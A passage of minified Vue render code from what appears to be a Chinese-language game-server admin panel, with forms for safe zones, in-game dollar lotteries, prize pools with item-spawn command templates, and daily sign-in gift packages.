dashed","border-radius":"4px"}},[i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("形状:")]),i("a-radio-group",{attrs:{disabled:!e.edit,"button-style":"solid"},on:{change:function(e){t.centerXY={x:"",y:""},t.radius=0,t.fromXY={x:"",y:""},t.toXY={x:"",y:""}}},model:{value:t.zoneType,callback:function(i){e.$set(t,"zoneType",i)},expression:"ServerSafeZone.zoneType"}},[i("a-radio-button",{attrs:{value:"circle"}},[e._v("圆圈")]),i("a-radio-button",{attrs:{value:"rectangle"}},[e._v("四边形")])],1),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.ServerSafeZones.splice(a,1)}}},[e._v("移除")])],1),"circle"===t.zoneType?i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("圆心XY坐标点:")]),i("a-input-number",{staticStyle:{width:"calc((100% - 140px) / 2)"},attrs:{placeholder:"X坐标",disabled:!e.edit},model:{value:t.centerXY.x,callback:function(i){e.$set(t.centerXY,"x",i)},expression:"ServerSafeZone.centerXY.x"}}),i("a-input-number",{staticStyle:{width:"calc((100% - 140px) / 2)","margin-left":"10px"},attrs:{placeholder:"Y坐标",disabled:!e.edit},model:{value:t.centerXY.y,callback:function(i){e.$set(t.centerXY,"y",i)},expression:"ServerSafeZone.centerXY.y"}})],1):e._e(),"circle"===t.zoneType?i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("半径:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 130px)"},attrs:{placeholder:"X坐标",disabled:!e.edit},model:{value:t.radius,callback:function(i){e.$set(t,"radius",i)},expression:"ServerSafeZone.radius"}})],1):e._e(),"rectangle"===t.zoneType?i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("左上角XY坐标点:")]),i("a-input-number",{staticStyle:{width:"calc((100% - 140px) / 2)"},attrs:{placeholder:"X坐标",disabled:!e.edit},model:{value:t.fromXY.x,callback:function(i){e.$set(t.fromXY,"x",i)},expression:"ServerSafeZone.fromXY.x"}}),i("a-input-number",{staticStyle:{width:"calc((100% - 140px) / 2)","margin-left":"10px"},attrs:{placeholder:"Y坐标",disabled:!e.edit},model:{value:t.fromXY.y,callback:function(i){e.$set(t.fromXY,"y",i)},expression:"ServerSafeZone.fromXY.y"}})],1):e._e(),"rectangle"===t.zoneType?i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("右下角XY坐标点:")]),i("a-input-number",{staticStyle:{width:"calc((100% - 140px) / 2)"},attrs:{placeholder:"X坐标",disabled:!e.edit},model:{value:t.toXY.x,callback:function(i){e.$set(t.toXY,"x",i)},expression:"ServerSafeZone.toXY.x"}}),i("a-input-number",{staticStyle:{width:"calc((100% - 140px) / 2)","margin-left":"10px"},attrs:{placeholder:"Y坐标",disabled:!e.edit},model:{value:t.toXY.y,callback:function(i){e.$set(t.toXY,"y",i)},expression:"ServerSafeZone.toXY.y"}})],1):e._e(),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("安全区有效期:")]),i("a-date-picker",{attrs:{disabled:!e.edit,"show-time":{format:"YYYY-MM-DD HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:t.expireTimeStamp,allowClear:""},on:{change:function(i){e.$set(t,"expireTimeStamp",i)}}})],1)])})):e._e()],2):e._e(),i("a-form-model-item",{attrs:{label:"美金抽奖奖池",prop:"StoreLuckyPrizeControl"}},[i("template",{slot:"extra"},[i("div",[e._v("每个奖品ID使用逗号隔开(奖品ID为0 - 7之间的整数)")]),i("div",[i("span",[i("strong",[e._v("0:")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("多谢惠顾")])]),i("span",{staticStyle:{"margin-left":"10px"}},[i("strong",[e._v("1:")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("50美金")])]),i("span",{staticStyle:{"margin-left":"10px"}},[i("strong",[e._v("2:")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("100美金")])]),i("span",{staticStyle:{"margin-left":"10px"}},[i("strong",[e._v("3:")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("200美金")])])]),i("div",[i("span",[i("strong",[e._v("4:")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("300美金")])]),i("span",{staticStyle:{"margin-left":"10px"}},[i("strong",[e._v("5:")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("500美金")])]),i("span",{staticStyle:{"margin-left":"10px"}},[i("strong",[e._v("6:")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("800美金")])]),i("span",{staticStyle:{"margin-left":"10px"}},[i("strong",[e._v("7:")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("1000美金")])])])]),i("a-input",{attrs:{type:"textarea","auto-size":{minRows:6,maxRows:6},placeholder:"用逗号隔开的数字(0 - 7)",disabled:!e.edit},model:{value:e.settingsForm.StoreLuckyPrizeControl,callback:function(t){e.$set(e.settingsForm,"StoreLuckyPrizeControl",t)},expression:"settingsForm.StoreLuckyPrizeControl"}})],2),i("a-form-model-item",{attrs:{label:"物品抽奖(原定期福利)自由购买",prop:"EnableRandomPrizeDollarPurchase"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableRandomPrizeDollarPurchase,callback:function(t){e.$set(e.settingsForm,"EnableRandomPrizeDollarPurchase",t)},expression:"settingsForm.EnableRandomPrizeDollarPurchase"}})],1),i("a-form-model-item",{attrs:{label:"物品抽奖超过免费次数后所需美金",prop:"RandomPrizePrice",rules:{required:e.settingsForm.EnableRandomPrizeDollarPurchase,trigger:"change",message:"请输入超过免费次数定期福利所需美金",validator:function(t,i,a){e.settingsForm.EnableRandomPrizeDollarPurchase&&"number"==typeof i&&i>0||!e.settingsForm.EnableRandomPrizeDollarPurchase?a():a(new e.Error("请输入超过免费次数定期福利所需美金"))}}}},[i("a-input-number",{attrs:{min:0,disabled:!e.edit||!e.settingsForm.EnableRandomPrizeDollarPurchase},model:{value:e.settingsForm.RandomPrizePrice,callback:function(t){e.$set(e.settingsForm,"RandomPrizePrice",t)},expression:"settingsForm.RandomPrizePrice"}})],1),i("a-form-model-item",{attrs:{label:"物品十连抽(单次)所需美金",prop:"RandomPrizePrice10",rules:{required:e.settingsForm.EnableRandomPrizeDollarPurchase,trigger:"change",message:"请输入物品十连抽(单次)所需美金",validator:function(t,i,a){e.settingsForm.EnableRandomPrizeDollarPurchase&&"number"==typeof i&&i>0||!e.settingsForm.EnableRandomPrizeDollarPurchase?a():a(new e.Error("请输入物品十连抽所需美金"))}}}},[i("a-input-number",{attrs:{min:0,disabled:!e.edit||!e.settingsForm.EnableRandomPrizeDollarPurchase},model:{value:e.settingsForm.RandomPrizePrice10,callback:function(t){e.$set(e.settingsForm,"RandomPrizePrice10",t)},expression:"settingsForm.RandomPrizePrice10"}})],1),i("a-form-model-item",{attrs:{label:"物品抽奖奖池",prop:"StoreRandomPrizePool"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.StoreRandomPrizePool.push({prizeName:"",commands:"",sendType:"immediate",isTeleport:!0,noTeleportMode:"mode1",isNoPrize:!1})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.StoreRandomPrizePool?"up":"down"},on:{click:function(){e.$set(e.expander,"StoreRandomPrizePool",!e.expander.StoreRandomPrizePool)}}},[e._v(e._s(e.expander.StoreRandomPrizePool?"隐藏":"显示"))])],1),e.expander.StoreRandomPrizePool?e._l(e.settingsForm.StoreRandomPrizePool,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("奖品描述:")]),i("a-input",{staticStyle:{width:"calc(100% - 140px)","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.prizeName,callback:function(i){e.$set(t,"prizeName",i)},expression:"StoreRandomPrize.prizeName"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.StoreRandomPrizePool.splice(a,1)}}},[e._v("移除 ")])],1),i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("奖品图片链接:")]),i("image-select",{staticStyle:{display:"inline-block",width:"calc(100% - 115px)","margin-left":"5px"},attrs:{disabled:!e.edit,"show-upload-config":t.showUploadConfig,value:t.imgSrc},on:{"change-show-upload-config":function(e){t.showUploadConfig=e},change:function(i){e.$set(t,"imgSrc",i),e.$nextTick((function(){e.$refs.settingsForm.validate()}))}}}),i("a-tooltip",{attrs:{placement:"left",title:"可以上传图片或直接使用图片url"}},[i("a-icon",{staticStyle:{"margin-left":"8px",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("奖品发放时机(十连抽不生效):")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.sendType,callback:function(i){e.$set(t,"sendType",i)},expression:"StoreRandomPrize.sendType"}},[i("a-radio",{attrs:{value:"immediate"}},[e._v("立即发放")]),i("a-radio",{attrs:{value:"set"}},[e._v("套餐领取")])],1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("奖品发放方式:")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.isTeleport,callback:function(i){e.$set(t,"isTeleport",i)},expression:"StoreRandomPrize.isTeleport"}},[i("a-radio",{attrs:{value:!0}},[e._v("需要传送")]),i("a-radio",{attrs:{value:!1}},[e._v("不需要传送")])],1)],1),!1===t.isTeleport?i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("隔空刷货的格式")]),i("a-popover",{attrs:{placement:"left"}},[i("div",{staticStyle:{width:"500px"},attrs:{slot:"content"},slot:"content"},[i("p",{staticStyle:{"font-weight":"bolder"}},[e._v('模式一: 【#spawnXXXX <商品> <数量> Location "<X坐标> <Y坐标> <Z坐标>"】 发货前获取坐标')]),i("p",{staticStyle:{"font-weight":"bolder"}},[e._v('模式二: 【#spawnXXXX <商品> <数量> Location "{X=<X坐标> Y=<Y坐标> Z=<Z坐标>|P=<俯仰角> Y=<侧航角> R=<翻滚角>}"】 发货前获取坐标')]),i("p",{staticStyle:{"font-weight":"bolder"}},[e._v("模式三: 【#spawnXXXX <商品> <数量> Location <Steam ID>】")])]),i("a-icon",{staticStyle:{"margin-left":"2px",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1),i("span",[e._v(":")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit||!0===t.isTeleport},model:{value:t.noTeleportMode,callback:function(i){e.$set(t,"noTeleportMode",i)},expression:"StoreRandomPrize.noTeleportMode"}},[i("a-radio",{attrs:{disabled:!e.edit||!0===t.isTeleport,value:"mode1"}},[e._v("模式一")]),i("a-radio",{attrs:{disabled:!0,value:"mode2"}},[e._v("模式二")]),i("a-radio",{attrs:{disabled:!e.edit||!0===t.isTeleport,value:"mode3"}},[e._v("模式三")])],1)],1):e._e(),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("没有中奖:")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.isNoPrize,callback:function(i){e.$set(t,"isNoPrize",i)},expression:"StoreRandomPrize.isNoPrize"}},[i("a-radio",{attrs:{value:!0}},[e._v("是")]),i("a-radio",{attrs:{value:!1}},[e._v("否")])],1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("中奖率(%):")]),i("a-input-number",{staticStyle:{width:"calc(100% - 140px)","margin-left":"5px"},attrs:{value:t.rate,disabled:!e.edit,min:0,max:100},on:{change:function(t){return e.processNumber(t,a)}}})],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("生成命令")]),i("a-tooltip",{attrs:{placement:"top",title:"每一条消息/命令使用回车键换行隔开(特殊命令: <ctrl-a> - 全选; <x> - 按下X键; <ctrl-c> - 复制; <ctrl-v> - 粘贴; <enter> - 回车; <tab> / <tab-n> - tab键; <clean-didi-vehicles> - 清空滴滴车)"}},[i("a-icon",{staticStyle:{"margin-left":"2px",cursor:"pointer","vertical-align":"top",transform:"translateY(13px)"},attrs:{type:"info-circle",theme:"filled"}})],1),i("span",{staticStyle:{"margin-left":"4px","vertical-align":"top"}},[e._v(":")]),i("div",{staticStyle:{width:"calc(100% - 85px)","margin-left":"5px",position:"relative",display:"inline-block"}},[i("a-input",{staticStyle:{width:"100%"},attrs:{type:"textarea",disabled:!e.edit,"auto-size":{minRows:6,maxRows:6},placeholder:"每一条内容以回车换行隔开"},model:{value:t.commands,callback:function(i){e.$set(t,"commands",i)},expression:"StoreRandomPrize.commands"}}),e.edit?i("commands-picker",{on:{select:function(e,i){t.commands=t.commands+(t.commands.length?"\n":"")+e+("number"==typeof i&&i>=2?i<=10?" "+i:" 10":"")}}}):e._e()],1)],1)])})):e._e()],2),i("a-form-model-item",{attrs:{label:"新手签到N日礼包设置",prop:"NDayGiftConfig"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.NDayGiftConfig.push({name:"",imgSrc:"",configType:"command",commands:"",sendType:"immediate",isTeleport:!0,noTeleportMode:"mode1"})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.NDayGiftConfig?"up":"down"},on:{click:function(){e.$set(e.expander,"NDayGiftConfig",!e.expander.NDayGiftConfig)}}},[e._v(e._s(e.expander.NDayGiftConfig?"隐藏":"显示"))])],1),e.expander.NDayGiftConfig?e._l(e.settingsForm.NDayGiftConfig,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",{staticStyle:{width:"100%",height:"28px","line-height":"28px","font-weight":"800"}},[e._v("第"+e._s(a+1)+"天")]),i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("礼包描述:")]),i("a-input",{staticStyle:{width:"calc(100% - 140px)","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.name,callback:function(i){e.$set(t,"name",i)},expression:"gift.name"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.NDayGiftConfig.splice(a,1)}}},[e._v("移除 ")])],1),i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("礼包图片链接:")]),i("image-select",{staticStyle:{display:"inline-block",width:"calc(100% - 115px)","margin-left":"5px"},attrs:{disabled:!e.edit,"show-upload-config":t.showUploadConfig,value:t.imgSrc},on:{"change-show-upload-config":function(e){t.showUploadConfig=e},change:function(i){e.$set(t,"imgSrc",i),e.$nextTick((function(){e.$refs.settingsForm.validate()}))}}}),i("a-tooltip",{attrs:{placement:"left",title:"可以上传图片或直接使用图片url"}},[i("a-icon",{staticStyle:{"margin-left":"8px",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("礼包类型:")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},on:{change:function(t){e.onChangeGiftConfigType(a,t.target.value)}},model:{value:t.configType,callback:function(i){e.$set(t,"configType",i)},expression:"gift.configType"}},[i("a-radio",{attrs:{value:"command"}},[e._v("生成命令的商品")]),i("a-radio",{attrs:{value:"dollar"}},[e._v("美金")]),i("a-radio",{attrs:{value:"vip"}},[e._v("会员等级")]),i("a-radio",{attrs:{value:"military"}},[e._v("军衔等级")])],1)],1),"command"===t.configType?[i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("礼包发放时机:")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.sendType,callback:function(i){e.$set(t,"sendType",i)},expression:"gift.sendType"}},[i("a-radio",{attrs:{value:"immediate"}},[e._v("立即发放")]),i("a-radio",{attrs:{value:"set"}},[e._v("套餐领取")])],1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("奖品发放方式:")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.isTeleport,callback:function(i){e.$set(t,"isTeleport",i)},expression:"gift.isTeleport"}},[i("a-radio",{attrs:{value:!0}},[e._v("需要传送")]),i("a-radio",{attrs:{value:!1}},[e._v("不需要传送")])],1)],1),!1===t.isTeleport?i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("隔空刷货的格式")]),i("a-popover",{attrs:{placement:"left"}},[i("div",{staticStyle:{width:"500px"},attrs:{slot:"content"},slot:"content"},[i("p",{staticStyle:{"font-weight":"bolder"}},[e._v('模式一: 【#spawnXXXX <商品> <数量> Location "<X坐标> <Y坐标> <Z坐标>"】 发货前获取坐标')]),i("p",{staticStyle:{"font-weight":"bolder"}},[e._v('模式二: 【#spawnXXXX <商品> <数量> Location "{X=<X坐标> Y=<Y坐标> Z=<Z坐标>|P=<俯仰角> Y=<侧航角> R=<翻滚角>}"】 发货前获取坐标')]),i("p",{staticStyle:{"font-weight":"bolder"}},[e._v("模式三: 【#spawnXXXX <商品> <数量> Location <Steam ID>】")])]),i("a-icon",{staticStyle:{"margin-left":"2px",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1),i("span",[e._v(":")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit||!0===t.isTeleport},model:{value:t.noTeleportMode,callback:function(i){e.$set(t,"noTeleportMode",i)},expression:"gift.noTeleportMode"}},[i("a-radio",{attrs:{disabled:!e.edit||!0===t.isTeleport,value:"mode1"}},[e._v("模式一")]),i("a-radio",{attrs:{disabled:!0,value:"mode2"}},[e._v("模式二")]),i("a-radio",{attrs:{disabled:!e.edit||!0===t.isTeleport,value:"mode3"}},[e._v("模式三")])],1)],1):e._e(),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("生成命令")]),i("a-tooltip",{attrs:{placement:"top",title:"每一条消息/命令使用回车键换行隔开(特殊命令: <ctrl-a> - 全选; <x> - 按下X键; <ctrl-c> - 复制; <ctrl-v> - 粘贴; <enter> - 回车; <tab> / <tab-n> - tab键; <clean-didi-vehicles> - 清空滴滴车)"}},[i("a-icon",{staticStyle:{"margin-left":"2px",cursor:"pointer","vertical-align":"top",transform:"translateY(13px)"},attrs:{type:"info-circle",theme:"filled"}})],1),i("span",{staticStyle:{"margin-left":"4px","vertical-align":"top"}},[e._v(":")]),i("div",{staticStyle:{width:"calc(100% - 85px)","margin-left":"5px",position:"relative",display:"inline-block"}},[i("a-input",{staticStyle:{width:"100%"},attrs:{type:"textarea",disabled:!e.edit,"auto-size":{minRows:6,maxRows:6},placeholder:"每一条内容以回车换行隔开"},model:{value:t.commands,callback:function(i){e.$set(t,"commands",i)},expression:"gift.commands"}}),e.edit?i("commands-picker",{on:{select:function(e,i){t.commands=t.commands+(t.commands.length?"\n":"")+e+("number"==typeof i&&i>=2?i<=10?" "+i:" 10":"")}}}):e._e()],1)],1)]:"dollar"===t.configType?[i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("赠送美金数量:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:0,disabled:!e.edit},model:{value:t.dollar,callback:function(i){e.$set(t,"dollar",i)},expression:"gift.dollar"}})],1)]:"vip"===t.configType?[i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("会员等级:")]),i("a-select",{staticStyle:{width:"calc(100% - 140px)","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.level,callback:function(i){e.$set(t,"level",i)},expression:"gift.level"}},e._l(e.levelList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("会员有效天数:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:0,disabled:!e.edit},model:{value:t.levelExpireDays,callback:function(i){e.$set(t,"levelExpireDays",i)},expression:"gift.levelExpireDays"}})],1)]:"military"===t.configType?[i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("军衔等级:")]),i("a-select",{staticStyle:{width:"calc(100% - 140px)","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.militaryLevelId,callback:function(i){e.$set(t,"militaryLevelId",i)},expression:"gift.militaryLevelId"}},e._l(e.militaryLevelList,(function(t){return i("a-select-option",{key:t.levelId,attrs:{title:t.level}},[e._v(e._s(t.level))])})),1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("军衔有效天数:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:0,disabled:!e.edit},model:{value:t.militaryLevelExpireDays,callback:function(i){e.$set(t,"militaryLevelExpireDays",i)},expression:"gift.militaryLevelExpireDays"}})],1)]:e._e()],2)})):e._e()],2),i("a-form-model-item",{attrs:{label:"新手签到N日礼包高级设置",prop:"NDayGiftFeeConfigs"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.NDayGiftFeeConfigs.push({level:"",configs:[]})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.NDayGiftFeeConfigs?"up":"down"},on:{click:function(){e.$set(e.expander,"NDayGiftFeeConfigs",!e.expander.NDayGiftFeeConfigs)}}},[e._v(e._s(e.expander.NDayGiftFeeConfigs?"隐藏":"显示"))])],1),e.expander.NDayGiftFeeConfigs?e._l(e.settingsForm.NDayGiftFeeConfigs,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("适用会员等级:")]),i("a-select",{staticStyle:{width:"calc(100% - 140px)","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.level,callback:function(i){e.$set(t,"level",i)},expression:"config.level"}},e._l(e.levelList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.NDayGiftFeeConfigs.splice(a,1)}}},[e._v("移除 ")])],1),i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("礼包配置:")]),i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){t.configs.push({name:"",imgSrc:"",configType:"command",commands:"",sendType:"immediate",isTeleport:!0,noTeleportMode:"mode1"})}}},[e._v("添加 ")])],1),e._l(t.configs,(function(n,r){return i("div",{key:r,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",{staticStyle:{width:"100%",height:"28px","line-height":"28px","font-weight":"800"}},[e._v("第"+e._s(r+1)+"天")]),i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("礼包描述:")]),i("a-input",{staticStyle:{width:"calc(100% - 140px)","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:n.name,callback:function(t){e.$set(n,"name",t)},expression:"gift.name"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){t.configs.splice(r,1)}}},[e._v("移除 ")])],1),i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("礼包图片链接:")]),i("image-select",{staticStyle:{display:"inline-block",width:"calc(100% - 115px)","margin-left":"5px"},attrs:{disabled:!e.edit,"show-upload-config":n.showUploadConfig,value:n.imgSrc},on:{"change-show-upload-config":function(e){n.showUploadConfig=e},change:function(t){e.$set(n,"imgSrc",t),e.$nextTick((function(){e.$refs.settingsForm.validate()}))}}}),i("a-tooltip",{attrs:{placement:"left",title:"可以上传图片或直接使用图片url"}},[i("a-icon",{staticStyle:{"margin-left":"8px",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("礼包类型:")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},on:{change:function(t){e.onChangeGiftConfigTypeSpecial(a,r,t.target.value)}},model:{value:n.configType,callback:function(t){e.$set(n,"configType",t)},expression:"gift.configType"}},[i("a-radio",{attrs:{value:"command"}},[e._v("生成命令的商品")]),i("a-radio",{attrs:{value:"dollar"}},[e._v("美金")]),i("a-radio",{attrs:{value:"vip"}},[e._v("会员等级")]),i("a-radio",{attrs:{value:"military"}},[e._v("军衔等级")])],1)],1),"command"===n.configType?[i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("礼包发放时机:")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:n.sendType,callback:function(t){e.$set(n,"sendType",t)},expression:"gift.sendType"}},[i("a-radio",{attrs:{value:"immediate"}},[e._v("立即发放")]),i("a-radio",{attrs:{value:"set"}},[e._v("套餐领取")])],1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("奖品发放方式:")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:n.isTeleport,callback:function(t){e.$set(n,"isTeleport",t)},expression:"gift.isTeleport"}},[i("a-radio",{attrs:{value:!0}},[e._v("需要传送")]),i("a-radio",{attrs:{value:!1}},[e._v("不需要传送")])],1)],1),!1===n.isTeleport?i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("隔空刷货的格式")]),i("a-popover",{attrs:{placement:"left"}},[i("div",{staticStyle:{width:"500px"},attrs:{slot:"content"},slot:"content"},[i("p",{staticStyle:{"font-weight":"bolder"}},[e._v('模式一: 【#spawnXXXX <商品> <数量> Location "<X坐标> <Y坐标> <Z坐标>"】 发货前获取坐标')]),i("p",{staticStyle:{"font-weight":"bolder"}},[e._v('模式二: 【#spawnXXXX <商品> <数量> Location "{X=<X坐标> Y=<Y坐标> Z=<Z坐标>|P=<俯仰角> Y=<侧航角> R=<翻滚角>}"】 发货前获取坐标')]),i("p",{staticStyle:{"font-weight":"bolder"}},[e._v("模式三: 【#spawnXXXX <商品> <数量> Location <Steam ID>】")])]),i("a-icon",{staticStyle:{"margin-left":"2px",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1),i("span",[e._v(":")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit||!0===n.isTeleport},model:{value:n.noTeleportMode,callback:function(t){e.$set(n,"noTeleportMode",t)},expression:"gift.noTeleportMode"}},[i("a-radio",{attrs:{disabled:!e.edit||!0===n.isTeleport,value:"mode1"}},[e._v("模式一")]),i("a-radio",{attrs:{disabled:!0,value:"mode2"}},[e._v("模式二")]),i("a-radio",{attrs:{disabled:!e.edit||!0===n.isTeleport,value:"mode3"}},[e._v("模式三")])],1)],1):e._e(),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("生成命令")]),i("a-tooltip",{attrs:{placement:"top",title:"每一条消息/命令使用回车键换行隔开(特殊命令: <ctrl-a> - 全选; <x> - 按下X键; <ctrl-c> - 复制; <ctrl-v> - 粘贴; <enter> - 回车; <tab> / <tab-n> - tab键; <clean-didi-vehicles> - 清空滴滴车)"}},[i("a-icon",{staticStyle:{"margin-left":"2px",cursor:"pointer","vertical-align":"top",transform:"translateY(13px)"},attrs:{type:"info-circle",theme:"filled"}})],1),i("span",{staticStyle:{"margin-left":"4px","vertical-align":"top"}},[e._v(":")]),i("div",{staticStyle:{width:"calc(100% - 